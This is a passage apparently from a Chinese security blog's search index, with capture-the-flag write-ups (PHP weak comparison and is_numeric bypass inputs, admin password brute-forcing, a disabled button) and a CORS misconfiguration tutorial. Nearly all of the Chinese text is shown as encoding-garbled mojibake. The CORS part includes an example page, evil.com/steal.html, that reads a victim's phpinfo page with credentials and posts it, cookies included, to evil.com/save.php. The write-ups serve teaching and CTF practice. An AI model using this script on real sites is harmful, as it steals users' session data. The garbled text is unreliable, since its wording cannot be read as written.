æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œå¦‚æœâ€™a==0â€˜ä¸ºtrueï¼Œä½†aæœ¬èº«ä¸æ˜¯0ï¼Œåˆ™è¾“å‡ºä¸€éƒ¨åˆ†flagï¼Œæ¥ä¸‹æ¥åˆ¤æ–­bï¼Œå¦‚æœbä¸æ˜¯æ•°å­—ï¼Œä¸”bå¤§äº1234ï¼Œåˆ™è¾“å‡ºå‰©ä¸‹éƒ¨åˆ†çš„flag é¦–å…ˆaæ˜¯ä¸€ä¸ªå¼±ç±»å‹æ¯”è¾ƒï¼Œè€Œæ¯”è¾ƒæœ‰å¦‚ä¸‹æƒ…å†µ var_dump('a' == 0);\t//bool(true) var_dump('1a' == 1);\t//bool(true) var_dump('12a' == 1);\t//bool(false) 1. å­—ç¬¦ä¸²åœ¨å’Œæ•°å­—æ¯”è¾ƒçš„æ—¶å€™ä¼šå°†å­—ç¬¦ä¸²è½¬åŒ–ä¸ºæ•°å­—ï¼Œæ¯”å¦‚aè½¬æ¢å¤±è´¥æˆFalseï¼ŒFalseåˆå’Œ0å¼±ç±»å‹æ¯”è¾ƒæ˜¯ç›¸ç­‰çš„ï¼Œæ‰€ä»¥ç¬¬ä¸€ä¸ªæ˜¯trueã€‚ 2. ä½†æ˜¯å¦‚æœå­—ç¬¦ä¸²æ˜¯ä»¥æ•°å­—å¼€å¤´çš„ï¼Œé‚£ä¹ˆå°±ä¼šè½¬æˆè¿™ä¸ªæ•°å­—å†åšæ¯”è¾ƒï¼Œæ‰€ä»¥ç¬¬äºŒä¸ªä¹Ÿæ˜¯trueï¼Œç¬¬ä¸‰ä¸ªåˆ™æ˜¯å› ä¸ºè½¬æˆæ•°å­—åå˜æˆäº†12ï¼Œä¸ç­‰äº1ï¼Œåˆ™ä¸ºfalseã€‚ é‚£å¾ˆæ˜æ˜¾æˆ‘ä»¬ä»¤a=aå³å¯ç»•è¿‡ é’ˆå¯¹båˆ©ç”¨çš„æ˜¯is_numericå‡½æ•°ç‰¹æ€§ æ–¹æ³•ä¸€ åˆ©ç”¨æ•°ç»„+åå…­è¿›åˆ¶æ¥è¿›è¡Œç»•è¿‡ï¼Œæ­¤æ–¹æ³•ç”±äºis_numericå‡½æ•°ä¸èƒ½å¤„ç†æ•°ç»„ï¼Œé‚£ä¹ˆè¯¥å‡½æ•°ä¼šè¿”å›false b[]=58B æ–¹æ³•äºŒ b=1235%20 b=1235%00 æ–¹æ³•ä¸‰ phpä¸­å½“ä¸€ä¸ªå…¶ä»–æ•°æ®ç±»å‹å’Œæ•°å€¼ç±»å‹çš„æ•°æ®æ¯”è¾ƒå¤§å°æ—¶ï¼Œä¼šå…ˆå°†å…¶ä»–æ•°æ®ç±»å‹è½¬æ¢æˆæ•°å€¼ç±»å‹ï¼Œè¿™é‡Œè¾“å…¥ç±»ä¼¼9999aæ•°æ®ä¹Ÿå¯ç»•è¿‡ b=1235a æ­¤å‡½æ•°è‹¥æ˜¯åœ¨sqlæ³¨å…¥ä¸­ç¢°åˆ°ä¹Ÿå¯ä»¥ç”¨16è¿›åˆ¶æ¥ç»•è¿‡ï¼Œå°†sqlè¯­å¥è½¬ä¸º16è¿›åˆ¶å­—ç¬¦ä¸²å³å¯ å¦‚ä¸‹å›¾æˆåŠŸå¾—åˆ°flag","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"æ”»é˜²ä¸–ç•Œ-weak_auth","path":"/2023/07/27/weak-auth/","content":"é¢˜ç›®æè¿°ï¼š å°å®å†™äº†ä¸€ä¸ªç™»é™†éªŒè¯é¡µé¢ï¼Œéšæ‰‹å°±è®¾äº†ä¸€ä¸ªå¯†ç ã€‚ é¢˜ç›®è§£é¢˜ï¼š æ‰“å¼€é¡µé¢å‘ç°å¦‚ä¸‹å›¾æ˜¯ä¸€ä¸ªç®€å•çš„ç™»å½•é¡µé¢ æˆ‘ä»¬éšä¾¿è¾“ä¸€ç»„è´¦å·å¯†ç çœ‹çœ‹ å‘ç°å…¶åœ¨å¼¹å‡ºä¸€ä¸ªå¯†ç é”™è¯¯çš„è¾¹æ¡†åï¼Œé¡µé¢è·³åˆ°check.phpé¡µé¢ï¼ŒæŸ¥çœ‹æºä»£ç å‘ç° è¿™å¤§æ¦‚ç‡å°±æ˜¯è¦bpçˆ†ç ´äº†ï¼Œæˆ‘ä»¬ä¸æ€¥ï¼Œç°åœ¨ç™»å½•é¡µé¢å°è¯•å‡ æ‰‹ æˆ‘ä»¬æ­¤æ¬¡ä¿®æ”¹äº†è´¦æˆ·åï¼Œå‘ç°å¦‚ä¸Šå¼¹æ¡†ï¼Œè¿™è¯´æ˜æˆ‘ä»¬å¿…é¡»ä»¥adminèº«ä»½ç™»å½•ï¼Œå› æ­¤åªéœ€è¦æŠ“åŒ…çˆ†ç ´passwordå³å¯ å¦‚å›¾è®¾ç½®å¥½åå¼€å§‹çˆ†ç ´ å¦‚å›¾å‘ç°æ˜æ˜¾ç‚¹ï¼Œç‚¹å‡»çœ‹çœ‹å“åº” æ‰¾åˆ°flag","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"æ”»é˜²ä¸–ç•Œ-disabled_button","path":"/2023/07/27/disabled-button/","content":"é¢˜ç›®æè¿°ï¼š Xè€å¸ˆä»Šå¤©ä¸Šè¯¾è®²äº†å‰ç«¯çŸ¥è¯†ï¼Œç„¶åç»™äº†å¤§å®¶ä¸€ä¸ªä¸èƒ½æŒ‰çš„æŒ‰é’®ï¼Œå°å®æƒŠå¥‡åœ°å‘ç°è¿™ä¸ªæŒ‰é’®æŒ‰ä¸ä¸‹å»ï¼Œåˆ°åº•æ€ä¹ˆæ‰èƒ½æŒ‰ä¸‹å»å‘¢ï¼Ÿ é¢˜ç›®è§£é¢˜ï¼š é¦–å…ˆè¿›å…¥é¢˜ç›®å‘ç°å¦‚ä¸‹é¡µé¢ï¼š æ ¹æ®å·²æœ‰çš„é¢˜ç›®ä¿¡æ¯ï¼Œæˆ‘ä»¬çŒœæµ‹å¤§æ¦‚ç‡æ˜¯è¦æƒ³æ–¹æ³•æˆåŠŸç‚¹å‡»flagæŒ‰é’®å³å¯ï¼Œç»“åˆé¢˜ç›®æè¿°ï¼Œæˆ‘ä»¬è¦å€ŸåŠ©å‰ç«¯çŸ¥è¯†ã€‚ é¦–å…ˆæŸ¥çœ‹äº†æºä»£ç  æˆ‘ä»¬çœ‹åˆ°è¿™é‡Œåœ¨flagæŒ‰é’®å¤„æœ‰ä¸€ä¸ªdisabledå±æ€§ï¼Œè¿™å¯¼è‡´äº†ä»–çš„ä¸å¯ç‚¹å‡»ï¼Œæ¥ä¸‹æ¥å…ˆä¸Šä¸€æ‰‹GPTå›ç­” &lt;input disabled class=\"btn btn-default\" style=\"height:50px;width:200px;\" type=\"submit\" value=\"flag\" name=\"auth\" /&gt;ï¼š ä¸€ä¸ªè¾“å…¥å…ƒç´ ï¼Œtypeä¸º\"submit\"ï¼Œè¡¨ç¤ºæäº¤æŒ‰é’®ï¼› nameä¸º\"auth\"ï¼› valueä¸º\"flag\"ï¼Œæ˜¾ç¤ºåœ¨æŒ‰é’®ä¸Šçš„æ–‡æœ¬ï¼› disabledå±æ€§è®¾ç½®ä¸º\"disabled\"ï¼Œä½¿æŒ‰é’®ä¸å¯ç‚¹å‡»ï¼› classä¸º\"btn btn-default\"ï¼Œè¿™ä¸ªclassæ¥è‡ªä¹‹å‰å¼•ç”¨çš„Bootstrapæ ·å¼è¡¨ï¼Œç”¨äºè®¾ç½®æŒ‰é’®çš„æ ·å¼ï¼› styleå±æ€§è®¾ç½®äº†æŒ‰é’®çš„é«˜åº¦å’Œå®½åº¦ã€‚ ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬éœ€è¦æƒ³åŠæ³•å»æ‰disabledè¿™ä¸ªå±æ€§ï¼Œé‚£ä¹ˆå¾ˆæ˜æ˜¾æˆ‘ä»¬ç›´æ¥F12è¿›æ§åˆ¶å°ä¿®æ”¹å³å¯ åªéœ€å°†ä¸Šå›¾çš„disabledå±æ€§å»é™¤å³å¯ å¯ä»¥å‘ç°æŒ‰é’®äº®åº¦å˜é‡ï¼Œå³æˆ‘ä»¬å¯ä»¥ç‚¹å‡»äº†ï¼Œä¸è¿‡æˆ‘å†ç¬¬ä¸€æ¬¡ç‚¹å‡»çš„æ—¶å€™ä»ç„¶æ²¡ååº”ï¼Œé¡µé¢ç›´æ¥åˆ·æ–°åˆ°åˆå§‹çŠ¶æ€ï¼Œç”±æ­¤æˆ‘ä»¬å°è¯•bpæŠ“åŒ… å¦‚ä¸Šå›¾æˆåŠŸæ‹¿åˆ°flag","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"CORSè·¨åŸŸæ¼æ´","path":"/2023/07/26/cors-kua-yu-lou-dong/","content":"CORSè·¨åŸŸæ¼æ´ 0x01 æ¼æ´ç®€ä»‹ è·¨åŸŸèµ„æºå…±äº«(CORS)æ˜¯ä¸€ç§æ”¾å®½åŒæºç­–ç•¥çš„æœºåˆ¶ï¼Œå®ƒå…è®¸æµè§ˆå™¨å‘è·¨æºæœåŠ¡å™¨ï¼Œå‘å‡º XMLHttpRequest è¯·æ±‚ï¼Œä»è€Œå…‹æœäº† AJAX åªèƒ½åŒæºä½¿ç”¨çš„é™åˆ¶ï¼Œä»¥ä½¿ä¸åŒçš„ç½‘ç«™å¯ä»¥è·¨åŸŸè·å–æ•°æ®ï¼Œç›®å‰å·²ç»è¢«ç»å¤§å¤šæ•°æµè§ˆå™¨æ”¯æŒï¼Œå¹¶è¢«ä¸»æµç½‘ç«™å¹¿æ³›éƒ¨ç½²ä½¿ç”¨ã€‚è·¨åŸŸèµ„æºå…±äº« CORS æ¼æ´ä¸»è¦æ˜¯ç”±äºç¨‹åºå‘˜é…ç½®ä¸å½“ï¼Œå¯¹äº Origin æºæ ¡éªŒä¸ä¸¥æ ¼ï¼Œä»è€Œé€ æˆè·¨åŸŸé—®é¢˜ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ CORS é”™è¯¯é…ç½®æ¼æ´ï¼Œä»æ¶æ„ç½‘ç«™è·¨åŸŸè¯»å–å—å®³ç½‘ç«™çš„æ•æ„Ÿä¿¡æ¯ã€‚ æ˜¯H5æä¾›çš„ä¸€ç§æœºåˆ¶ï¼ŒWEBåº”ç”¨ç¨‹åºå¯ä»¥é€šè¿‡åœ¨HTTPå¢åŠ å­—æ®µæ¥å‘Šè¯‰æµè§ˆå™¨ï¼Œå“ªäº›ä¸åŒæ¥æºçš„æœåŠ¡å™¨æ˜¯æœ‰æƒè®¿é—®æœ¬ç«™èµ„æºçš„ï¼Œå½“ä¸åŒåŸŸçš„è¯·æ±‚å‘ç”Ÿæ—¶ï¼Œå°±å‡ºç°äº†è·¨åŸŸçš„ç°è±¡ã€‚ åŒæºç­–ç•¥ è¿™é‡Œæˆ‘ä»¬å¿…é¡»è¦äº†è§£ä¸€ä¸‹åŒæºç­–ç•¥ï¼šåŒæºç­–ç•¥æ˜¯ä¸€ç§é™åˆ¶æ€§çš„è·¨åŸŸè§„èŒƒï¼Œå®ƒé™åˆ¶äº†ç½‘ç«™ä¸æºåŸŸä¹‹å¤–çš„èµ„æºè¿›è¡Œäº¤äº’çš„èƒ½åŠ›ã€‚èµ·æºäºå¤šå¹´å‰çš„ç­–ç•¥æ˜¯é’ˆå¯¹æ½œåœ¨çš„æ¶æ„è·¨åŸŸäº¤äº’ï¼ˆä¾‹å¦‚ï¼Œä¸€ä¸ªç½‘ç«™ä»å¦ä¸€ä¸ªç½‘ç«™çªƒå–ç§äººæ•°æ®ï¼‰è€Œåˆ¶å®šçš„ã€‚é€šå¸¸ï¼Œå®ƒå…è®¸ä¸€ä¸ªåŸŸå‘å…¶ä»–åŸŸå‘å‡ºè¯·æ±‚ï¼Œä½†ä¸å…è®¸è®¿é—®å“åº”ã€‚æºç”±é€šä¿¡åè®®ï¼ŒåŸŸå’Œç«¯å£å·ç»„æˆã€‚ â€‹SOPæ˜¯ä¸€ä¸ªå¾ˆå¥½çš„ç­–ç•¥ï¼Œä½†æ˜¯éšç€Webåº”ç”¨çš„å‘å±•ï¼Œç½‘ç«™ç”±äºè‡ªèº«ä¸šåŠ¡çš„éœ€æ±‚ï¼Œéœ€è¦å®ç°ä¸€äº›è·¨åŸŸçš„åŠŸèƒ½ï¼Œèƒ½å¤Ÿè®©ä¸åŒåŸŸçš„é¡µé¢ä¹‹é—´èƒ½å¤Ÿç›¸äº’è®¿é—®å„è‡ªé¡µé¢çš„å†…å®¹ã€‚ ç®€å•æ¥è¯´:åŒæ—¶æ»¡è¶³åŒåè®®ï¼ŒåŒåŸŸåï¼ŒåŒç«¯å£è¿™ä¸‰ä¸ªæ¡ä»¶ï¼Œå°±æ˜¯åŒæºã€‚ æµè§ˆå™¨çš„åŒæºç­–ç•¥è§„å®šï¼šä¸åŒåŸŸçš„å®¢æˆ·ç«¯è„šæœ¬åœ¨æ²¡æœ‰æ˜ç¡®æˆæƒçš„æƒ…å†µä¸‹ï¼Œä¸èƒ½è¯»å†™å¯¹æ–¹çš„èµ„æºã€‚ SOPå…¨ç§°ä¸ºSame Origin Policyå³åŒæºç­–ç•¥ï¼Œè¯¥ç­–ç•¥æ˜¯æµè§ˆå™¨çš„ä¸€ä¸ªå®‰å…¨åŸºçŸ³ï¼ŒåŒæºç­–ç•¥è§„å®šï¼šä¸åŒåŸŸçš„å®¢æˆ·ç«¯è„šæœ¬åœ¨æ²¡æœ‰æ˜ç¡®æˆæƒçš„æƒ…å†µä¸‹ï¼Œä¸èƒ½è¯»å†™å¯¹æ–¹çš„èµ„æºã€‚ç®€å•æ¥è¯´åŒæºç­–ç•¥å°±æ˜¯æµè§ˆå™¨ä¼šé˜»æ­¢ä¸€ä¸ªæºä¸å¦ä¸€ä¸ªæºçš„èµ„æºäº¤äº’ã€‚å¯ä»¥è¯•æƒ³ä¸€ä¸‹ï¼Œå¦‚æœæ²¡æœ‰åŒæºç­–ç•¥ï¼Œå½“ä½ è®¿é—®ä¸€ä¸ªæ­£å¸¸ç½‘ç«™çš„æ—¶å€™åˆæ— æ„é—´æ‰“å¼€äº†å¦ä¸€ä¸ªæ¶æ„ç½‘ç«™ï¼Œæ¶æ„ç½‘ç«™ä¼šä»ä½ åˆšåˆšè®¿é—®çš„æ­£å¸¸ç½‘ç«™ä¸Šçªƒå–ä½ å…¨éƒ¨çš„ä¿¡æ¯ã€‚ è·¨åŸŸè®¿é—®çš„ä¸€äº›åœºæ™¯ æ¯”å¦‚åç«¯å¼€å‘å®Œä¸€éƒ¨åˆ†ä¸šåŠ¡ä»£ç åï¼Œæä¾›æ¥å£ç»™å‰ç«¯ç”¨ï¼Œåœ¨å‰åç«¯åˆ†ç¦»çš„æ¨¡å¼ä¸‹ï¼Œå‰åç«¯çš„åŸŸåæ˜¯ä¸ä¸€è‡´çš„ï¼Œæ­¤æ—¶å°±ä¼šå‘ç”Ÿè·¨åŸŸè®¿é—®çš„é—®é¢˜ã€‚ ç¨‹åºå‘˜åœ¨æœ¬åœ°åšå¼€å‘ï¼Œæœ¬åœ°çš„æ–‡ä»¶å¤¹å¹¶ä¸æ˜¯åœ¨ä¸€ä¸ªåŸŸä¸‹é¢ï¼Œå½“ä¸€ä¸ªæ–‡ä»¶éœ€è¦å‘é€ajaxè¯·æ±‚ï¼Œè¯·æ±‚å¦å¤–ä¸€ä¸ªé¡µé¢çš„å†…å®¹çš„æ—¶å€™ï¼Œå°±ä¼šè·¨åŸŸã€‚ ç”µå•†ç½‘ç«™æƒ³é€šè¿‡ç”¨æˆ·æµè§ˆå™¨åŠ è½½ç¬¬ä¸‰æ–¹å¿«é€’ç½‘ç«™çš„ç‰©æµä¿¡æ¯ã€‚ å­ç«™åŸŸåå¸Œæœ›è°ƒç”¨ä¸»ç«™åŸŸåçš„ç”¨æˆ·èµ„æ–™æ¥å£ï¼Œå¹¶å°†æ•°æ®æ˜¾ç¤ºå‡ºæ¥ã€‚ è·¨åŸŸè¯·æ±‚æ–¹å¼ CORSå®šä¹‰äº†ä¸¤ç§è·¨åŸŸè¯·æ±‚ï¼Œç®€å•è·¨åŸŸè¯·æ±‚å’Œéç®€å•è·¨åŸŸè¯·æ±‚ã€‚åªè¦åŒæ—¶æ»¡è¶³ä»¥ä¸‹ä¸¤å¤§æ¡ä»¶ï¼Œå°±å±äºç®€å•è¯·æ±‚ã€‚ è¯·æ±‚æ–¹æ³•æ˜¯ä»¥ä¸‹ä¸‰ç§æ–¹æ³•ä¹‹ä¸€ï¼š - HEAD - GET - POST HTTPçš„å¤´ä¿¡æ¯ä¸è¶…å‡ºä»¥ä¸‹å‡ ç§å­—æ®µï¼š - `Accept` - `Accept-Language` - `Content-Language` - `Last-Event-ID` - `Content-Type`ï¼šåªé™äºä¸‰ä¸ªå€¼`application/x-www-form-urlencoded`ã€`multipart/form-data`ã€`text/plain` ç®€å•çš„è¯´å°±æ˜¯è®¾ç½®äº†ä¸€ä¸ªç™½åå•ï¼Œç¬¦åˆè¿™ä¸ªæ¡ä»¶çš„æ‰æ˜¯ç®€å•è¯·æ±‚ã€‚å…¶ä»–ä¸ç¬¦åˆçš„éƒ½æ˜¯éç®€å•è¯·æ±‚ã€‚ æµè§ˆå™¨å¯¹ç®€å•è¯·æ±‚å’Œéç®€å•è¯·æ±‚çš„å¤„ç†æœºåˆ¶ä¸ä¸€æ ·ã€‚ å¯¹äºç®€å•è¯·æ±‚ï¼Œæµè§ˆå™¨å°±ä¼šç«‹åˆ»å‘é€è¿™ä¸ªè¯·æ±‚ã€‚ å¯¹äºéç®€å•è¯·æ±‚ï¼Œæµè§ˆå™¨ä¸ä¼šé©¬ä¸Šå‘é€è¿™ä¸ªè¯·æ±‚ï¼Œè€Œæ˜¯æœ‰ä¸€ä¸ªpreflightï¼Œè·ŸæœåŠ¡å™¨éªŒè¯çš„è¿‡ç¨‹ã€‚æµè§ˆå™¨å…ˆå‘é€ä¸€ä¸ªoptionsæ–¹æ³•çš„é¢„æ£€è¯·æ±‚ã€‚ 0x02 CORSè·¨åŸŸåŸç†åŠæ¼æ´æˆå›  æµè§ˆå™¨å°†CORSè¯·æ±‚åˆ†æˆä¸¤ç±»ï¼šç®€å•è¯·æ±‚ï¼ˆsimple requestï¼‰å’Œéç®€å•è¯·æ±‚ï¼ˆnot-so-simple requestï¼‰ã€‚ å¯¹äºç®€å•è¯·æ±‚ï¼Œå¤§è‡´æµç¨‹æ˜¯æµè§ˆå™¨å‘ç°è¿™ä¸€æ¬¡å‘æœåŠ¡å™¨æäº¤çš„è¯·æ±‚æ˜¯ç®€å•è¯·æ±‚ï¼Œæ‰€ä»¥è‡ªåŠ¨åœ¨å¤´ä¿¡æ¯ä¸­å¢åŠ äº†ä¸€ä¸ªOriginçš„å­—æ®µï¼Œç”¨æ¥è¡¨ç¤ºè¿™æ¬¡çš„è¯·æ±‚æ¥è‡ªå“ªä¸ªåŸŸã€‚å½“æœåŠ¡å™¨æ¥æ”¶åˆ°è¯·æ±‚åå‘ç°Originå­—æ®µæŒ‡å®šçš„åŸŸååœ¨è®¸å¯èŒƒå›´å†…ï¼ŒæœåŠ¡å™¨ä¼šåœ¨å“åº”åŒ…ä¸­å¢åŠ ä¸‰ä¸ªä¸CORSç›¸å…³çš„å­—æ®µï¼ŒAccess-Control-Allow-Originã€Access-Control-Allow-Credentialsã€Access-Control-Expose-Headersã€‚å…¶ä¸­Access-Control-Allow-Originå­—æ®µæ˜¯å¿…é¡»å­˜åœ¨çš„ï¼Œå®ƒçš„å€¼å¯èƒ½æ˜¯Originå­—æ®µçš„å€¼æˆ–è€…æ˜¯ä¸€ä¸ªé€šé…ç¬¦â€œ*â€ï¼Œè¡¨ç¤ºå¯ä»¥æ¥å—ä»»æ„åŸŸåçš„è¯·æ±‚ï¼Œå½“ç„¶å¤§éƒ¨åˆ†æœåŠ¡å™¨å¦‚æœé…ç½®äº†é€šé…ç¬¦çš„è¯ï¼Œä¿¡æ¯æ³„éœ²çš„é£é™©éª¤ç„¶åŠ å¤§ã€‚ å†å›åˆ°ä¸‰ä¸ªå­—æ®µä¸Šï¼Œå…¶ä¸­Access-Control-Allow-Credentialså­—æ®µä¸æ˜¯å¿…é€‰å­—æ®µï¼Œå®ƒçš„å€¼æ˜¯ä¸€ä¸ªå¸ƒå°”å€¼ä¸”åªèƒ½è®¾ç½®ä¸ºtrueï¼Œè¡¨ç¤ºæœåŠ¡å™¨å…è®¸æµè§ˆå™¨å°†cookieåŒ…å«åœ¨è¯·æ±‚ä¸­ï¼Œå¦åˆ™å°±ä¸æ·»åŠ æ­¤å­—æ®µã€‚ä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœè¦å‘é€cookieï¼ŒAccess-Control-Allow-Originå°±ä¸èƒ½è®¾ä¸ºæ˜Ÿå·ï¼Œå¿…é¡»æ˜ç¡®æŒ‡å®šä¸è¯·æ±‚ç½‘é¡µä¸€è‡´çš„åŸŸåï¼ŒåŒæ—¶Cookieä¾ç„¶éµå¾ªåŒæºç­–ç•¥ã€‚è€ŒAccess-Control-Expose-Headerså­—æ®µä¸»è¦æ˜¯æŒ‡å®šæƒ³è¦è·å–XMLHttpRequestå¯¹è±¡ä¸­getResponseHeaderï¼ˆï¼‰æ–¹æ³•çš„å…¶ä»–æœåŠ¡å™¨å­—æ®µã€‚ æ‰€è°“éç®€å•è¯·æ±‚å°±æ˜¯é‚£ç§å¯¹æœåŠ¡å™¨æå‡ºç‰¹æ®Šè¦æ±‚çš„è¯·æ±‚ï¼Œä¾‹å¦‚è¯·æ±‚æ–¹æ³•ä¸ºPUTæˆ–DELETEã€‚éç®€å•çš„CORSè¯·æ±‚ä¼šåœ¨æ­£å¼é€šä¿¡ä¹‹å‰ï¼Œå¢åŠ ä¸€æ¬¡HTTPæŸ¥è¯¢è¯·æ±‚ï¼Œç§°ä¹‹ä¸ºâ€œé¢„æ£€è¯·æ±‚â€ã€‚æµè§ˆå™¨å…ˆè¯¢é—®æœåŠ¡å™¨ï¼Œå½“å‰ç½‘é¡µæ‰€åœ¨çš„åŸŸåæ˜¯å¦åœ¨æœåŠ¡å™¨çš„è®¸å¯åå•é‡Œä»¥åŠå¯ä»¥ä½¿ç”¨å“ªäº›HTTPåŠ¨è¯å’Œå¤´ä¿¡æ¯å­—æ®µã€‚åªæœ‰è·å¾—äº†è‚¯å®šå“åº”ï¼Œæµè§ˆå™¨æ‰ä¼šæ­£å¼å‘å‡ºXMLHttpRequestè¯·æ±‚å¦åˆ™å°±æŠ¥é”™ã€‚è¿™ç§è¯·æ±‚çš„å¥½å¤„æ˜¯å¯¹ä¼ ç»Ÿçš„æ²¡æœ‰CORSæ”¯æŒçš„æœåŠ¡å™¨å‡å°å‹åŠ›ï¼Œç»™æœåŠ¡å™¨ä¸€ä¸ªæå‰æ‹’ç»çš„æœºä¼šã€‚å…·ä½“æµç¨‹å¦‚ä¸‹ï¼Œå½“æ„é€ è¯·æ±‚åŒ…çš„æ–¹æ³•æ˜¯PUTæˆ–DELETEå¹¶ä¼ ç»™æµè§ˆå™¨æ—¶ï¼Œæµè§ˆå™¨å‘ç°æ­¤è¯·æ±‚æ˜¯éç®€å•è¯·æ±‚æ‰€ä»¥æµè§ˆå™¨æ„é€ ä¸€ä¸ªé¢„æ£€è¯·æ±‚åŒ…ï¼Œè¯·æ±‚å¤´æ˜¯OPTIONSï¼Œå¹¶æºå¸¦ä¸‰ä¸ªå…³é”®å­—æ®µï¼ŒOriginã€Access-Control-Request-Methodã€Access-Control-Request-Headersã€‚å…¶ä¸­Access-Control-Request-Methodè¡¨ç¤ºæµè§ˆå™¨çš„CORSè¯·æ±‚ä¼šç”¨åˆ°å“ªäº›HTTPæ–¹æ³•ï¼ŒAccess-Control-Request-Headersè¡¨ç¤ºæµè§ˆå™¨CORSè¯·æ±‚ä¼šé¢å¤–å‘é€çš„å¤´ä¿¡æ¯å­—æ®µã€‚æœåŠ¡å™¨æ”¶åˆ°é¢„æ£€è¯·æ±‚åï¼Œæ£€æŸ¥äº†ä¸‰ä¸ªæ ¸å¿ƒå­—æ®µä»¥åå¦‚æœç¡®å®šå…è®¸è·¨åŸŸè¯·æ±‚ï¼Œä¼šè¿”å›ä¸€ä¸ªæ­£å¸¸çš„HTTPå›åº”ï¼Œå¹¶æºå¸¦ä¼ å…¥çš„CORSå¤´ä¿¡æ¯ã€‚å¦‚æœæœåŠ¡å™¨å¦å®šè¯·æ±‚ï¼Œè™½ç„¶ä¹Ÿä¼šè¿”å›ä¸€ä¸ªæ­£å¸¸çš„HTTPå›åº”ä½†æ˜¯æ²¡æœ‰ä»»ä½•CORSç›¸å…³çš„å¤´ä¿¡æ¯å­—æ®µï¼Œæˆ–æ˜ç¡®è¡¨ç¤ºè¯·æ±‚ä¸ç¬¦åˆæ¡ä»¶ã€‚æµè§ˆå™¨æ ¹æ®é¢„è¯·æ±‚çš„è¿”å›ç»“æœå†³å®šæ¥ä¸‹æ¥æ˜¯è¿›è¡Œç®€å•è¯·æ±‚è¿˜æ˜¯æ‹’ç»è¯·æ±‚ã€‚ CORSä½¿ç”¨æ£€æŸ¥è¯·æ±‚å¤´çš„ç›¸å…³å­—æ®µå’ŒæœåŠ¡ç«¯çš„è§„åˆ™è¿›è¡Œå¯¹æ¯”ï¼Œæ¥é€‰æ‹©æ˜¯å¦å…è®¸è·¨åŸŸã€‚ä½†å‡¡æ˜¯éœ€è¦é…ç½®è§„åˆ™çš„ç¨‹åºï¼Œé¿å…ä¸äº†ä¼šå‡ºç°ä¸€äº›æ„å¤–ï¼Œå°±åƒå¾ˆå¤šèµ„æ·±ç¨‹åºå‘˜æœ‰æ—¶ä¹Ÿä¼šå†™ä¸å‡ºæ°å½“çš„æ­£åˆ™ä¸€æ ·ï¼Œå½“æœåŠ¡ç«¯é…ç½®çš„è§„åˆ™ä¸å¤Ÿåˆç†ï¼Œå¯¼è‡´éåŒåŸŸçš„èµ„æºå¯ä»¥äº’ç›¸è®¿é—®ï¼Œä¾‹å¦‚Access-Control-Allow-Origin: *ã€‚CORSåè€Œä½¿åŒæºç­–ç•¥çš„ä¿æŠ¤æœºåˆ¶åœŸå´©ç“¦è§£ã€‚å› æ­¤ï¼ŒCORSæ¼æ´çš„æˆå› å¾ˆæ˜æ˜¾ï¼Œå°±æ˜¯æœåŠ¡ç«¯é…ç½®çš„è§„åˆ™ä¸å½“æ‰€å¯¼è‡´çš„ã€‚ 0x03 CORSæ¼æ´æ”»å‡»æµç¨‹ 1.å‡è®¾ç”¨æˆ·ç™»é™†ä¸€ä¸ªå«æœ‰CORSé…ç½®ç½‘ç«™foo.comï¼ŒåŒæ—¶åˆè®¿é—®äº†æ”»å‡»è€…æä¾›çš„ä¸€ä¸ªé“¾æ¥evil.comã€‚ 2.evil.comçš„ç½‘ç«™å‘foo.comè¿™ä¸ªç½‘ç«™å‘èµ·è¯·æ±‚è·å–æ•æ„Ÿæ•°æ®ï¼Œæµè§ˆå™¨èƒ½å¦æ¥æ”¶ä¿¡æ¯å–å†³äºfoo.comçš„é…ç½®ã€‚ 3.å¦‚æœfoo.comé…ç½®äº†Access-Control-Allow-Originå¤´ä¸”ä¸ºé¢„æœŸï¼Œé‚£ä¹ˆå…è®¸æ¥æ”¶ï¼Œå¦åˆ™æµè§ˆå™¨ä¼šå› ä¸ºåŒæºç­–ç•¥è€Œä¸æ¥æ”¶ã€‚ http://foo.com/index.phpä»£ç å¦‚ä¸‹ http://foo.com/phpinfo.phpä»£ç å¦‚ä¸‹ åœ¨è®¿é—®index.phpåå†æ¬¡è®¿é—®phpinfo.phpå°±å¯ä»¥åœ¨phpinfoé¡µé¢å‘ç°httponlyçš„COOKIEï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬å‡è®¾æ­¤cookieå°±æ˜¯é»‘å®¢æƒ³è¦è·å–çš„æ•æ„Ÿä¿¡æ¯ã€‚ ç„¶åæ„é€ é»‘å®¢å‘ç”Ÿé€ç»™ç”¨æˆ·çš„æ¶æ„é¡µé¢http://evil.com/steal.html &lt;!DOCTYPE&gt; &lt;html&gt; &lt;h1&gt;CORS test&lt;/h1&gt; &lt;script type=\"text/javascript\"&gt; function loadXMLDoc() { var xhr1; var xhr2; if(window.XMLHttpRequest) { xhr1 = new XMLHttpRequest(); xhr2 = new XMLHttpRequest(); } else { xhr1 = new ActiveXObject(\"Microsoft.XMLHTTP\"); xhr2= new ActiveXObject(\"Microsoft.XMLHTTP\"); } xhr1.onreadystatechange=function() { if(xhr1.readyState == 4 &amp;&amp; xhr1.status == 200) //if receive xhr1 response { var datas=xhr1.responseText; xhr2.open(\"POST\",\"http://evil.com/save.php\",\"true\"); alert('3'); xhr2.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded;charset=utf-8\"); xhr2.send(\"T1=\"+escape(datas)); } } xhr1.open(\"GET\",\"http://foo.com/phpinfo.php\",\"true\") //request user page. alert(xhr1.responseText); xhr1.withCredentials = true; //request with cookie xhr1.send(); } loadXMLDoc(); &lt;/script&gt; &lt;/html&gt; å½“ç”¨æˆ·ç‚¹å¼€æ­¤ç½‘é¡µæ—¶ï¼Œç”±evil.comé€šè¿‡AJAXå‘å‡ºä¸€ä¸ªå‘foo.comçš„èµ„æºè¯·æ±‚ï¼Œæ‰€ä»¥æµè§ˆå™¨è‡ªåŠ¨æ·»åŠ äº†Originå­—æ®µã€‚ 